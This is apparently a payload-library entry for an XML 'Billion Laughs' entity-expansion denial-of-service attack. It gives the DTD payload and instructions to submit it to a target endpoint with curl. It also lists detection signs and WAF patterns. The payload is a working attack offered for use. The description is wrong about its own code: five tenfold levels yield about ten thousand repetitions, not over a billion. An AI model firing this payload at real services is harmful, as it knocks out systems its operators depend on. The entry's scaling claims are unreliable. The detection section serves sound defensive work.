---
type: code
language: xml
verified: true
tags:
  - dos
  - xxe
  - payload
platforms:
  - Web
validated: true
---

# XML-Billion-Laughs-Entity-Bomb

## Code

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## Description

This XML code implements a Billion Laughs attack payload by defining a series of internal entities that reference each other recursively. When processed by a vulnerable XML parser with entity expansion enabled, 'a4' expands to over a billion repetitions of 'dos', causing exponential memory growth and potential DoS. It exploits XXE-like processing without external entities, focusing on internal DTD amplification.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static payload with no variables; customize the base string ('dos') or nesting levels if needed for variations. | N/A |

## Usage

Save the code to a file (e.g., billion_laughs.xml) and submit it to a target XML-processing endpoint via POST request using tools like curl. Ideal for testing web apps with XXE vulnerabilities or insecure parsers. Start with lower nesting (e.g., up to a3) for controlled testing to avoid local crashes.

## Detection

- Scan XML inputs for DOCTYPE declarations with multiple ENTITY definitions referencing prior entities.
- Monitor parser logs for entity expansion warnings or excessive recursion depth.
- Detect spikes in memory/CPU during XML processing; use tools like XMLSec to validate and limit expansion.
- WAF rules to block payloads with patterns like repeated '&a[0-9];' references.

## Related

- [[procedures/Billion-Laugh-Attack-via-XXE-for-DoS]]
